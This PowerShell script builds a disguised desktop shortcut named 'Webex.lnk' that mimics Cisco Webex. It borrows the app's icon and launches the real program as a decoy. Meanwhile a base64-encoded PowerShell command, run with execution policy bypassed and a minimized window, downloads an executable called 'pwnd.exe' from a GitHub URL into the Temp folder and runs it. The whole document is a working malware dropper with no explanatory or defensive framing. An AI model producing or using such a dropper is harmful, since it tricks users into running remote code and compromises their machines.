#set variables
$payloadURL="`"https://github.com/bsoroudi/easymoney/blob/main/pwnd.exe?raw=true`""
$payloadPath="`"`$home\AppData\Local\Temp\pwnd.exe`""
$ShortcutFileName= "Webex.lnk"
$DecoyLegitApp= "C:\Users\bsoroudi\AppData\Local\Programs\Cisco Spark\CiscoCollabHost.exe"

#encoded payload (don't edit)
$Payload = "start-process `"$DecoyLegitApp`"; (New-Object System.Net.WebClient).DownloadFile($payloadURL,$payloadPath); & $payloadPath"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$EncodedPayload =[Convert]::ToBase64String($Bytes)


#lnk file properties (don't edit)
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\$ShortcutFileName")
$ShortCut.WindowStyle = 7
$ShortCut.TargetPath = "powershell.exe"
$ShortCut.Arguments = "powershell.exe -ExecutionPolicy Bypass -noLogo -encodedcommand $EncodedPayload"
$ShortCut.IconLocation = "$DecoyLegitApp, 0";
$Shortcut.WorkingDirectory = "$(split-path $DecoyLegitApp)\"
$ShortCut.Description = "Type: Application";
$ShortCut.Save()


